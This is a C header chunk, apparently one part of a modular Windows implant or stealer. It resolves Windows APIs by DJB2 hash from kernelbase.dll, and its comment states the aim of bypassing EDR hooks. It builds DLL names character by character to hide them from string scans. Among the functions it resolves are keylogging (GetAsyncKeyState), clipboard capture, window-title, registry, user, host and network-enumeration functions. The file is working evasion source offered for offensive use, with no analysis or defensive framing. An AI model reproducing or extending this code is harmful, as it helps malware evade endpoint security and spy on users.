// chunk: api_resolve/api_set_redirect
// depends: (none)
// provides: djb2_hash, resolve_api, api, resolve_all_apis
// headers: windows.h
// note: Kernelbase-first resolution + DJB2 hash — resolves from kernelbase.dll (where most kernel32 APIs actually live on Win10+) to bypass EDR hooks on kernel32 exports, then falls back to kernel32 for any missing APIs

#ifndef CHUNK_API_SET_REDIRECT
#define CHUNK_API_SET_REDIRECT

#include <windows.h>

/* DJB2 hash for PE export walking */
static DWORD djb2_hash(const char *str) {
    DWORD h = 5381;
    int c;
    while ((c = *str++))
        h = ((h << 5) + h) + c;
    return h;
}

static FARPROC resolve_api(HMODULE mod, DWORD hash) {
    if (!mod) return NULL;
    BYTE *base = (BYTE *)mod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return NULL;
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);

    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)(base + names[i]);
        if (djb2_hash(name) == hash)
            return (FARPROC)(base + funcs[ords[i]]);
    }
    return NULL;
}

/* kernel32 */
typedef HANDLE (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_CloseHandle)(HANDLE);
typedef BOOL   (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL   (WINAPI *fn_CopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef DWORD  (WINAPI *fn_GetFileAttributesA)(LPCSTR);
typedef BOOL   (WINAPI *fn_DeleteFileA)(LPCSTR);
typedef BOOL   (WINAPI *fn_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef DWORD  (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
typedef DWORD  (WINAPI *fn_GetFileSize)(HANDLE, LPDWORD);
typedef DWORD  (WINAPI *fn_GetTempPathA)(DWORD, LPSTR);
typedef BOOL   (WINAPI *fn_GetComputerNameA)(LPSTR, LPDWORD);
typedef void   (WINAPI *fn_Sleep)(DWORD);
typedef DWORD  (WINAPI *fn_GetTickCount)(void);
typedef LPVOID (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE (WINAPI *fn_FindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *fn_FindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *fn_FindClose)(HANDLE);
typedef BOOL   (WINAPI *fn_CreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
typedef DWORD  (WINAPI *fn_GetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
typedef void   (WINAPI *fn_GetNativeSystemInfo)(LPSYSTEM_INFO);
typedef BOOL   (WINAPI *fn_GetDiskFreeSpaceExA)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
typedef DWORD  (WINAPI *fn_GetLogicalDriveStringsA)(DWORD, LPSTR);
typedef UINT   (WINAPI *fn_GetDriveTypeA)(LPCSTR);
typedef void   (WINAPI *fn_GetLocalTime)(LPSYSTEMTIME);
typedef int    (WINAPI *fn_MultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
typedef int    (WINAPI *fn_WideCharToMultiByte)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
typedef HMODULE(WINAPI *fn_GetModuleHandleA)(LPCSTR);
typedef DWORD  (WINAPI *fn_GetLastError)(void);
/* advapi32 */
typedef BOOL   (WINAPI *fn_GetUserNameA)(LPSTR, LPDWORD);
typedef LONG   (WINAPI *fn_RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG   (WINAPI *fn_RegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG   (WINAPI *fn_RegEnumValueA)(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG   (WINAPI *fn_RegEnumKeyExA)(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPSTR, LPDWORD, PFILETIME);
typedef LONG   (WINAPI *fn_RegCloseKey)(HKEY);
/* user32 */
typedef BOOL   (WINAPI *fn_EnumWindows)(WNDENUMPROC, LPARAM);
typedef int    (WINAPI *fn_GetWindowTextA)(HWND, LPSTR, int);
typedef BOOL   (WINAPI *fn_OpenClipboard)(HWND);
typedef HANDLE (WINAPI *fn_GetClipboardData)(UINT);
typedef BOOL   (WINAPI *fn_CloseClipboard)(void);
typedef HWND   (WINAPI *fn_GetForegroundWindow)(void);
typedef SHORT  (WINAPI *fn_GetAsyncKeyState)(int);
typedef void   (WINAPI *fn_keybd_event)(BYTE, BYTE, DWORD, ULONG_PTR);
/* shell32 */
typedef HRESULT(WINAPI *fn_SHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
/* iphlpapi */
typedef ULONG  (WINAPI *fn_GetAdaptersInfo)(/*PIP_ADAPTER_INFO*/void*, PULONG);
typedef DWORD  (WINAPI *fn_GetExtendedTcpTable)(PVOID, PDWORD, BOOL, ULONG, /*TCP_TABLE_CLASS*/int, ULONG);

static struct {
    /* kernel32 */
    fn_CreateFileA       pCreateFileA;
    fn_ReadFile          pReadFile;
    fn_WriteFile         pWriteFile;
    fn_CloseHandle       pCloseHandle;
    fn_CreateProcessA    pCreateProcessA;
    fn_CopyFileA         pCopyFileA;
    fn_GetFileAttributesA pGetFileAttributesA;
    fn_DeleteFileA       pDeleteFileA;
    fn_CreatePipe        pCreatePipe;
    fn_WaitForSingleObject pWaitForSingleObject;
    fn_GetFileSize       pGetFileSize;
    fn_GetTempPathA      pGetTempPathA;
    fn_GetComputerNameA  pGetComputerNameA;
    fn_Sleep             pSleep;
    fn_GetTickCount      pGetTickCount;
    fn_VirtualAlloc      pVirtualAlloc;
    fn_FindFirstFileA    pFindFirstFileA;
    fn_FindNextFileA     pFindNextFileA;
    fn_FindClose         pFindClose;
    fn_CreateDirectoryA  pCreateDirectoryA;
    fn_GetEnvironmentVariableA pGetEnvironmentVariableA;
    fn_GetNativeSystemInfo pGetNativeSystemInfo;
    fn_GetDiskFreeSpaceExA pGetDiskFreeSpaceExA;
    fn_GetLogicalDriveStringsA pGetLogicalDriveStringsA;
    fn_GetDriveTypeA     pGetDriveTypeA;
    fn_GetLocalTime      pGetLocalTime;
    fn_MultiByteToWideChar pMultiByteToWideChar;
    fn_WideCharToMultiByte pWideCharToMultiByte;
    fn_GetModuleHandleA  pGetModuleHandleA;
    fn_GetLastError      pGetLastError;
    /* advapi32 */
    fn_GetUserNameA      pGetUserNameA;
    fn_RegOpenKeyExA     pRegOpenKeyExA;
    fn_RegQueryValueExA  pRegQueryValueExA;
    fn_RegEnumValueA     pRegEnumValueA;
    fn_RegEnumKeyExA     pRegEnumKeyExA;
    fn_RegCloseKey       pRegCloseKey;
    /* user32 */
    fn_EnumWindows       pEnumWindows;
    fn_GetWindowTextA    pGetWindowTextA;
    fn_OpenClipboard     pOpenClipboard;
    fn_GetClipboardData  pGetClipboardData;
    fn_CloseClipboard    pCloseClipboard;
    fn_GetForegroundWindow pGetForegroundWindow;
    fn_GetAsyncKeyState pGetAsyncKeyState;
    fn_keybd_event     pkeybd_event;
    /* shell32 */
    fn_SHGetFolderPathA  pSHGetFolderPathA;
    /* iphlpapi */
    fn_GetAdaptersInfo   pGetAdaptersInfo;
    fn_GetExtendedTcpTable pGetExtendedTcpTable;
} api = {0};

static int resolve_all_apis(void) {
    char _n[20];

    _n[0]='k'; _n[1]='e'; _n[2]='r'; _n[3]='n'; _n[4]='e'; _n[5]='l';
    _n[6]='b'; _n[7]='a'; _n[8]='s'; _n[9]='e'; _n[10]='.'; _n[11]='d';
    _n[12]='l'; _n[13]='l'; _n[14]=0;
    HMODULE kb = LoadLibraryA(_n);

    _n[6]='3'; _n[7]='2'; _n[8]='.'; _n[9]='d'; _n[10]='l'; _n[11]='l'; _n[12]=0;
    HMODULE k32 = LoadLibraryA(_n);

    _n[0]='a'; _n[1]='d'; _n[2]='v'; _n[3]='a'; _n[4]='p'; _n[5]='i';
    _n[6]='3'; _n[7]='2'; _n[8]='.'; _n[9]='d'; _n[10]='l'; _n[11]='l'; _n[12]=0;
    HMODULE adv = LoadLibraryA(_n);

    _n[0]='u'; _n[1]='s'; _n[2]='e'; _n[3]='r'; _n[4]='3'; _n[5]='2';
    _n[6]='.'; _n[7]='d'; _n[8]='l'; _n[9]='l'; _n[10]=0;
    HMODULE u32 = LoadLibraryA(_n);

    _n[0]='s'; _n[1]='h'; _n[2]='e'; _n[3]='l'; _n[4]='l'; _n[5]='3';
    _n[6]='2'; _n[7]='.'; _n[8]='d'; _n[9]='l'; _n[10]='l'; _n[11]=0;
    HMODULE sh32 = LoadLibraryA(_n);

    _n[0]='i'; _n[1]='p'; _n[2]='h'; _n[3]='l'; _n[4]='p'; _n[5]='a';
    _n[6]='p'; _n[7]='i'; _n[8]='.'; _n[9]='d'; _n[10]='l'; _n[11]='l'; _n[12]=0;
    HMODULE iphlp = LoadLibraryA(_n);

    if (!k32 && !kb) return 0;

    /* Prefer kernelbase for core APIs, fall back to kernel32 */
    HMODULE pri = kb ? kb : k32;

    /* kernel32 — resolve from kernelbase first, fallback to kernel32 */
    api.pCreateFileA       = (fn_CreateFileA)resolve_api(pri, 0xeb96c5fa);
    if (!api.pCreateFileA) api.pCreateFileA = (fn_CreateFileA)resolve_api(k32, 0xeb96c5fa);
    api.pReadFile          = (fn_ReadFile)resolve_api(pri, 0x71019921);
    if (!api.pReadFile) api.pReadFile = (fn_ReadFile)resolve_api(k32, 0x71019921);
    api.pWriteFile         = (fn_WriteFile)resolve_api(pri, 0x663cecb0);
    if (!api.pWriteFile) api.pWriteFile = (fn_WriteFile)resolve_api(k32, 0x663cecb0);
    api.pCloseHandle       = (fn_CloseHandle)resolve_api(pri, 0x3870ca07);
    if (!api.pCloseHandle) api.pCloseHandle = (fn_CloseHandle)resolve_api(k32, 0x3870ca07);
    api.pCreateProcessA    = (fn_CreateProcessA)resolve_api(pri, 0xaeb52e19);
    if (!api.pCreateProcessA) api.pCreateProcessA = (fn_CreateProcessA)resolve_api(k32, 0xaeb52e19);
    api.pCopyFileA         = (fn_CopyFileA)resolve_api(pri, 0xac2253c1);
    if (!api.pCopyFileA) api.pCopyFileA = (fn_CopyFileA)resolve_api(k32, 0xac2253c1);
    api.pGetFileAttributesA = (fn_GetFileAttributesA)resolve_api(pri, 0xcc9c6ccd);
    if (!api.pGetFileAttributesA) api.pGetFileAttributesA = (fn_GetFileAttributesA)resolve_api(k32, 0xcc9c6ccd);
    api.pDeleteFileA       = (fn_DeleteFileA)resolve_api(pri, 0x1cd88719);
    if (!api.pDeleteFileA) api.pDeleteFileA = (fn_DeleteFileA)resolve_api(k32, 0x1cd88719);
    api.pCreatePipe        = (fn_CreatePipe)resolve_api(pri, 0x9a8deee7);
    if (!api.pCreatePipe) api.pCreatePipe = (fn_CreatePipe)resolve_api(k32, 0x9a8deee7);
    api.pWaitForSingleObject = (fn_WaitForSingleObject)resolve_api(pri, 0xeccda1ba);
    if (!api.pWaitForSingleObject) api.pWaitForSingleObject = (fn_WaitForSingleObject)resolve_api(k32, 0xeccda1ba);
    api.pGetFileSize       = (fn_GetFileSize)resolve_api(pri, 0x7891c520);
    if (!api.pGetFileSize) api.pGetFileSize = (fn_GetFileSize)resolve_api(k32, 0x7891c520);
    api.pGetTempPathA      = (fn_GetTempPathA)resolve_api(pri, 0x9ef979e9);
    if (!api.pGetTempPathA) api.pGetTempPathA = (fn_GetTempPathA)resolve_api(k32, 0x9ef979e9);
    api.pGetComputerNameA  = (fn_GetComputerNameA)resolve_api(pri, 0xaa63bfb6);
    if (!api.pGetComputerNameA) api.pGetComputerNameA = (fn_GetComputerNameA)resolve_api(k32, 0xaa63bfb6);
    api.pSleep             = (fn_Sleep)resolve_api(pri, 0x0e19e5fe);
    if (!api.pSleep) api.pSleep = (fn_Sleep)resolve_api(k32, 0x0e19e5fe);
    api.pGetTickCount      = (fn_GetTickCount)resolve_api(pri, 0x41ad16b9);
    if (!api.pGetTickCount) api.pGetTickCount = (fn_GetTickCount)resolve_api(k32, 0x41ad16b9);
    api.pVirtualAlloc      = (fn_VirtualAlloc)resolve_api(pri, 0x382c0f97);
    if (!api.pVirtualAlloc) api.pVirtualAlloc = (fn_VirtualAlloc)resolve_api(k32, 0x382c0f97);
    api.pFindFirstFileA    = (fn_FindFirstFileA)resolve_api(pri, 0xae2636cf);
    if (!api.pFindFirstFileA) api.pFindFirstFileA = (fn_FindFirstFileA)resolve_api(k32, 0xae2636cf);
    api.pFindNextFileA     = (fn_FindNextFileA)resolve_api(pri, 0xf3b43c46);
    if (!api.pFindNextFileA) api.pFindNextFileA = (fn_FindNextFileA)resolve_api(k32, 0xf3b43c46);
    api.pFindClose         = (fn_FindClose)resolve_api(pri, 0xb4e7451c);
    if (!api.pFindClose) api.pFindClose = (fn_FindClose)resolve_api(k32, 0xb4e7451c);
    api.pCreateDirectoryA  = (fn_CreateDirectoryA)resolve_api(pri, 0x41fabfef);
    if (!api.pCreateDirectoryA) api.pCreateDirectoryA = (fn_CreateDirectoryA)resolve_api(k32, 0x41fabfef);
    api.pGetEnvironmentVariableA = (fn_GetEnvironmentVariableA)resolve_api(pri, 0x87889701);
    if (!api.pGetEnvironmentVariableA) api.pGetEnvironmentVariableA = (fn_GetEnvironmentVariableA)resolve_api(k32, 0x87889701);
    api.pGetNativeSystemInfo = (fn_GetNativeSystemInfo)resolve_api(pri, 0x395dc89d);
    if (!api.pGetNativeSystemInfo) api.pGetNativeSystemInfo = (fn_GetNativeSystemInfo)resolve_api(k32, 0x395dc89d);
    api.pGetDiskFreeSpaceExA = (fn_GetDiskFreeSpaceExA)resolve_api(pri, 0x3dfe2f3c);
    if (!api.pGetDiskFreeSpaceExA) api.pGetDiskFreeSpaceExA = (fn_GetDiskFreeSpaceExA)resolve_api(k32, 0x3dfe2f3c);
    api.pGetLogicalDriveStringsA = (fn_GetLogicalDriveStringsA)resolve_api(pri, 0x89478d45);
    if (!api.pGetLogicalDriveStringsA) api.pGetLogicalDriveStringsA = (fn_GetLogicalDriveStringsA)resolve_api(k32, 0x89478d45);
    api.pGetDriveTypeA     = (fn_GetDriveTypeA)resolve_api(pri, 0x74bb7682);
    if (!api.pGetDriveTypeA) api.pGetDriveTypeA = (fn_GetDriveTypeA)resolve_api(k32, 0x74bb7682);
    api.pGetLocalTime      = (fn_GetLocalTime)resolve_api(pri, 0x12d7e0df);
    if (!api.pGetLocalTime) api.pGetLocalTime = (fn_GetLocalTime)resolve_api(k32, 0x12d7e0df);
    api.pMultiByteToWideChar = (fn_MultiByteToWideChar)resolve_api(pri, 0xe2fdda8e);
    if (!api.pMultiByteToWideChar) api.pMultiByteToWideChar = (fn_MultiByteToWideChar)resolve_api(k32, 0xe2fdda8e);
    api.pWideCharToMultiByte = (fn_WideCharToMultiByte)resolve_api(pri, 0xe65d31ce);
    if (!api.pWideCharToMultiByte) api.pWideCharToMultiByte = (fn_WideCharToMultiByte)resolve_api(k32, 0xe65d31ce);
    api.pGetModuleHandleA  = (fn_GetModuleHandleA)resolve_api(pri, 0x5a153f58);
    if (!api.pGetModuleHandleA) api.pGetModuleHandleA = (fn_GetModuleHandleA)resolve_api(k32, 0x5a153f58);
    api.pGetLastError      = (fn_GetLastError)resolve_api(pri, 0x2082eae3);
    if (!api.pGetLastError) api.pGetLastError = (fn_GetLastError)resolve_api(k32, 0x2082eae3);

    /* advapi32 */
    if (adv) {
        api.pGetUserNameA      = (fn_GetUserNameA)resolve_api(adv, 0x9bc3ab46);
        api.pRegOpenKeyExA     = (fn_RegOpenKeyExA)resolve_api(adv, 0x074a975c);
        api.pRegQueryValueExA  = (fn_RegQueryValueExA)resolve_api(adv, 0x6b95d114);
        api.pRegEnumValueA     = (fn_RegEnumValueA)resolve_api(adv, 0x86652116);
        api.pRegEnumKeyExA     = (fn_RegEnumKeyExA)resolve_api(adv, 0x6d0b1b5f);
        api.pRegCloseKey       = (fn_RegCloseKey)resolve_api(adv, 0x736b3702);
    }

    /* user32 */
    if (u32) {
        api.pEnumWindows       = (fn_EnumWindows)resolve_api(u32, 0x94cfdcc5);
        api.pGetWindowTextA    = (fn_GetWindowTextA)resolve_api(u32, 0xc8419003);
        api.pOpenClipboard     = (fn_OpenClipboard)resolve_api(u32, 0x774dfc27);
        api.pGetClipboardData  = (fn_GetClipboardData)resolve_api(u32, 0x8d26572f);
        api.pCloseClipboard    = (fn_CloseClipboard)resolve_api(u32, 0x8c0b3b8b);
        api.pGetForegroundWindow = (fn_GetForegroundWindow)resolve_api(u32, 0x0a7f6978);
        api.pGetAsyncKeyState  = (fn_GetAsyncKeyState)resolve_api(u32, 0x1124460d);
        api.pkeybd_event       = (fn_keybd_event)resolve_api(u32, 0xb8199eb5);
    }

    /* shell32 */
    if (sh32) {
        api.pSHGetFolderPathA  = (fn_SHGetFolderPathA)resolve_api(sh32, 0xa15ce62a);
    }

    /* iphlpapi */
    if (iphlp) {
        api.pGetAdaptersInfo   = (fn_GetAdaptersInfo)resolve_api(iphlp, 0xbc950fc5);
        api.pGetExtendedTcpTable = (fn_GetExtendedTcpTable)resolve_api(iphlp, 0x4659fa05);
    }

    return api.pCreateFileA != NULL;
}

#endif
